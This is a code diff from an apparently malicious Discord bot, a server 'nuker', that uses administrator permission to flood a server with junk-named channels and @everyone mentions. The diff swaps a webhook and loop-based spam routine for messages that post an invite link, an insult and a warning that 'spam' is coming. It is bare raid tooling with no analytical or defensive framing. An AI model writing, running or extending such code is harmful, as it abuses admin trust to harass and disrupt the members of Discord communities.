@@ -283,21 +283,9 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
         setTimeout(() => { 
            msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(p => {
                 p.send("@everyone all hail me")
-                p.createWebhook("assy").then(w => {
-                         
-                    [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                        w.send(randomT() + " @everyone")
-                        
-                    
-                    })
-                
-                })
-                var spam = 0
-                while(spam < 15) 
-            {    
-                p.send(randomT() + " @everyone")
-                spam++
-            }
+                p.send("https://discord.gg/hKVK9r7DGt @everyone")
+                p.send("kiss my disrespectful ass @everyone")
+                p.send("wait 7 seconds for the spam btw")
              })
           while(pray < 2) {
          msg.guild.channels.create('匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂').then(p => {
